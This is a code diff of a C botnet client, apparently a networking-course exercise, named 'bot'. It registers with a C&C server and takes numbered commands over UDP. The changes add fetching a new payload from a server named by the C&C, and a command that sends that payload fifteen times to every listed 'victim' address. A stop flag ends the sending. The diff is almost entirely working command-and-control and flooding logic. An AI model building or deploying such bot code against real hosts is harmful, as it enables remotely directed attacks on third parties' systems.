@@ -10,10 +10,12 @@
 #define MAX_UDP_THREAD_COUNT 50
 #define MAX_TCP_THREAD_COUNT 50
 #define MAX_MESSAGE_SIZE 1024
+#define NUMBER_OF_MESSAGES_TO_BE_SENT 15
 
 char payload[MAX_MESSAGE_SIZE] = "payload";
 int stop_sending_flag = 1;
 pthread_mutex_t mutex;
+struct sockaddr_in server_addr;
 
 // Structure to hold the data for the UDP thread
 struct data_for_registration_and_UDP {
@@ -55,11 +57,10 @@ void *handle_UDP_message(void *arg) {
     // Cast the argument to a pointer to the data_to_handle_UDP structure
     struct data_to_handle_UDP *handle_UDP_data = (struct data_to_handle_UDP *)arg;
 
-    printf("Recieved message: ");
-        for(int i=0; i<handle_UDP_data->message_size; ++i){
-            printf("%c", handle_UDP_data->message[i]);
-        }
-        printf("\n");
+    struct sockaddr_in temp_server_addr;
+    pthread_mutex_lock(&mutex);
+    temp_server_addr = server_addr;
+    pthread_mutex_unlock(&mutex);
 
     // Checking if message is from C&C or from another source
     if ((memcmp(&handle_UDP_data->incoming_addr.sin_addr, &handle_UDP_data->CnC_server_addr.sin_addr, sizeof(struct in_addr)) == 0) && (ntohs(handle_UDP_data->incoming_addr.sin_port) == ntohs(handle_UDP_data->CnC_server_addr.sin_port))) {
@@ -98,14 +99,14 @@ void *handle_UDP_message(void *arg) {
                 if ((TCP_sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
                     perror("TCP_Socket creation failed");
                 }
-                // Inizializing the server struct
-                struct sockaddr_in server_addr;
-                memset(&server_addr, 0, sizeof(server_addr));
-                server_addr.sin_family = AF_INET;
+
+                pthread_mutex_lock(&mutex);
+                // Setting up the rest of global server address struct with the given ip and port
                 server_addr.sin_port = htons(atoi(ports[0]));
                 if (inet_pton(AF_INET, ips[0], &server_addr.sin_addr) <= 0) {
                     perror("Invalid IP address");
                 }
+                pthread_mutex_unlock(&mutex);
 
                 // Connecting to server
                 if (connect(TCP_sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
@@ -127,51 +128,78 @@ void *handle_UDP_message(void *arg) {
                     printf("Server disconnected or error occurred\n");
                 }
                 else{
-                    printf("Received from server: %s\n", recieved_TCP_message_buffer);
+                    // If message from server is recieved setting it as new payload
+                    char current_payload[MAX_MESSAGE_SIZE];
+                    pthread_mutex_lock(&mutex);
+                    strcpy(payload, recieved_TCP_message_buffer);
+                    strcpy(current_payload, payload);
+                    pthread_mutex_unlock(&mutex);  
+                    printf("New payload is: %s\n", current_payload);
                 }
-
+                
                 // Close the socket
                 close(TCP_sockfd);
             }
             else if(command == '2'){
-                // Inizializing the victaddr struct
-                struct sockaddr_in vict_addr;
-                memset(&vict_addr, 0, sizeof(vict_addr));
-                vict_addr.sin_family = AF_INET;
-                vict_addr.sin_port = htons(atoi(ports[0]));
-                if (inet_pton(AF_INET, ips[0], &vict_addr.sin_addr) <= 0) {
+                pthread_mutex_lock(&mutex);
+                // Setting up the rest of global server address struct with the given ip and port
+                server_addr.sin_port = htons(atoi(ports[0]));
+                if (inet_pton(AF_INET, ips[0], &server_addr.sin_addr) <= 0) {
                     perror("Invalid IP address");
                 }
-                char *message_for_UDP_server = "HELLO";
+                pthread_mutex_unlock(&mutex);
+
+                char *message_for_UDP_server = "HELLO\n";
                 // Sending "HELLO" message to UDP_server
-                if (sendto(handle_UDP_data->UDP_socket, message_for_UDP_server, strlen(message_for_UDP_server), 0, (const struct sockaddr *)&vict_addr, sizeof(vict_addr)) < 0) {
+                if (sendto(handle_UDP_data->UDP_socket, message_for_UDP_server, strlen(message_for_UDP_server), 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                     perror("Send message failed");
                 } else {
                     printf("HELLO message sent to %s:%s\n", ips[0], ports[0]);
                 }
             }
             else if(command == '3'){
+                char current_payload[MAX_MESSAGE_SIZE];
+                int stop_sending;
+                // Locking the mutex for synchronisation issues and setting the stop_sending_flag
+                pthread_mutex_lock(&mutex);
+                stop_sending_flag = 0;
+                pthread_mutex_unlock(&mutex);
+                
                 // Inizializing the victaddr struct
                 struct sockaddr_in vict_addr;
-                for(int i=0; i<ip_port_pairs_received; ++i){
-                    memset(&vict_addr, 0, sizeof(vict_addr));
-                    vict_addr.sin_family = AF_INET;
-                    vict_addr.sin_port = htons(atoi(ports[i]));
-                    if (inet_pton(AF_INET, ips[i], &vict_addr.sin_addr) <= 0) {
-                        perror("Invalid IP address");
-                    }
+                for(int j = 0; j < NUMBER_OF_MESSAGES_TO_BE_SENT; ++j ){
+                    for(int i = 0; i<ip_port_pairs_received; ++i){
+                        // Seting the vict addr to the curent adress
+                        memset(&vict_addr, 0, sizeof(vict_addr));
+                        vict_addr.sin_family = AF_INET;
+                        vict_addr.sin_port = htons(atoi(ports[i]));
+                        if (inet_pton(AF_INET, ips[i], &vict_addr.sin_addr) <= 0) {
+                            perror("Invalid IP address");
+                        }
 
-                    char current_payload[MAX_MESSAGE_SIZE];
-                    // Locking the mutex for synchronisation issues and checking the current payload
-                    pthread_mutex_lock(&mutex);
-                    strcpy(current_payload, payload);
-                    pthread_mutex_unlock(&mutex);
-                    
-                    // Sending payload to victims
-                    if (sendto(handle_UDP_data->UDP_socket, current_payload, strlen(current_payload), 0, (const struct sockaddr *)&vict_addr, sizeof(vict_addr)) < 0) {
-                        perror("Send message failed");
-                    } else {
-                        printf("\"%s\" message sent to %s:%s\n", current_payload, ips[i], ports[i]);
+                        // Locking the mutex for synchronisation issues and checking the current payload and stop_sending_flag
+                        pthread_mutex_lock(&mutex);
+                        strcpy(current_payload, payload);
+                        stop_sending = stop_sending_flag;
+                        pthread_mutex_unlock(&mutex);
+                        
+                        if(stop_sending){
+                            printf("Stoping sending messages\n");
+                            // Free the message memory
+                            free(handle_UDP_data->message);
+                            // Free the allocated data structure memory
+                            free(handle_UDP_data);
+                            pthread_exit(NULL);
+                        }
+
+                        // Sending payload to victims
+                        if (sendto(handle_UDP_data->UDP_socket, current_payload, strlen(current_payload), 0, (const struct sockaddr *)&vict_addr, sizeof(vict_addr)) < 0) {
+                            perror("Send message failed");
+                        } else {
+                            printf("\"%s\" message sent to %s:%s\n", current_payload, ips[i], ports[i]);
+                        }
+
+                        sleep(1);
                     }
                 }
             }
@@ -190,12 +218,26 @@ void *handle_UDP_message(void *arg) {
             }
             printf("\n");
         }
-    } else {
+    }
+    else if ((memcmp(&handle_UDP_data->incoming_addr.sin_addr, &temp_server_addr.sin_addr, sizeof(struct in_addr)) == 0) && (ntohs(handle_UDP_data->incoming_addr.sin_port) == ntohs(temp_server_addr.sin_port))) {
+        // If message from server is recieved setting it as new payload
+        char current_payload[MAX_MESSAGE_SIZE];
+        pthread_mutex_lock(&mutex);
+        strcpy(payload, handle_UDP_data->message);
+        strcpy(current_payload, payload);
+        pthread_mutex_unlock(&mutex);  
+        printf("New payload is: %s\n", current_payload);
+    }
+    else {
         printf("Recieved message: \"");
         for(int i=0; i<handle_UDP_data->message_size; ++i){
             printf("%c", handle_UDP_data->message[i]);
         }
         printf("\" from %s %d\n", inet_ntoa(handle_UDP_data->incoming_addr.sin_addr), ntohs(handle_UDP_data->incoming_addr.sin_port));
+        // STOP signal recieved setting stop_sending_flag to 1 with mutex
+        pthread_mutex_lock(&mutex);
+        stop_sending_flag = 1;
+        pthread_mutex_unlock(&mutex);   
     }
 
     // Free the message memory
@@ -273,6 +315,14 @@ void *listen_for_UDP_message(void *arg){
 
 int main(int argc, char *argv[]) {
 
+    // Simple start for program
+    /*if (argc != 3) {
+        printf("Usage: ./bot server_ip server_port\n");
+        exit(1);
+    }
+    char *server_ip = argv[1];
+    int server_port = atoi(argv[2]);*/
+
     // Program call options
     int opt;
     static struct option long_options[] = {
@@ -338,6 +388,12 @@ int main(int argc, char *argv[]) {
         perror("Invalid IP address");
         return 1;
     }
+
+    pthread_mutex_lock(&mutex);
+    // Set up the global server address struct but for now we do not know the ip and port until we get it from C&C
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    pthread_mutex_unlock(&mutex);
 
     // Data that needs to be passed for registration message to the thread
     struct data_for_registration_and_UDP reg_UDP_data;
